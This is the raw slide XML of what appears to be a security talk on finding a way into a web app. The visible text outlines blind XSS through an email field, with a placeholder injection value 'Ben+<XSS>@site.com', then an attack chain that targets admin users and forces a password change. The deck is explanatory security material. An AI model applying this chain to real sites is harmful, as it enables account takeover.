              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>BXSS seems more fun</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>XSS in Name 🚫</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>XSS in Address 🚫</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>XSS in account details 🚫</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>XSS via email address ✅</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="430" name="Shape 430"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="431" name="Google Shape;431;p55"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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2" name="Google Shape;432;p55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="433" name="Google Shape;433;p55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="774450" y="266850"/>
            <a:ext cx="7595100" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Looking For A Way In</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="434" name="Google Shape;434;p55"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="435" name="Google Shape;435;p55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="4311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t/>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="436" name="Google Shape;436;p55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="3324600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>CSRF OR BXSS </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>CSRF is lame </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>BXSS seems more fun</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>XSS in Name 🚫</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>XSS in Address 🚫</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>XSS in account details 🚫</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>XSS via email address ✅</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Ben+&lt;XSS&gt;@site.com</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="440" name="Shape 440"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="441" name="Google Shape;441;p56"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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2" name="Google Shape;442;p56"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="443" name="Google Shape;443;p56"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="950325" y="266850"/>
            <a:ext cx="7595100" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Chain # 2</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="444" name="Google Shape;444;p56"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="445" name="Google Shape;445;p56"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="2970600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>BXSS any user with access to admin</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Login or force them to </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Change user password</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
